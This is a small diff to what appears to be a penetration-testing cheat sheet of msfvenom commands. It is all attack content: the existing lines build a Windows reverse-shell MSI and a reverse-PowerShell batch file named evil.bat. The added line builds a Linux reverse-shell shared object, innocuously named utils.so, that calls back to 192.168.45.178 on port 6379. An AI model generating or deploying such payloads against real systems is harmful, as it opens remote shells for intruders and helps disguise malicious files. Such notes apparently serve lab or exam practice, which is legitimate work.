@@ -44,3 +44,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.187 LPORT=21 -f msi > pri
 
 # Windows Bat File
 msfvenom -p cmd/windows/reverse_powershell lhost= lport= > evil.bat
+
+# Shared Object - Linux (.so)
+msfvenom -p linux/x86/shell_reverse_tcp -f elf-so LHOST=192.168.45.178 LPORT=6379 -o utils.so
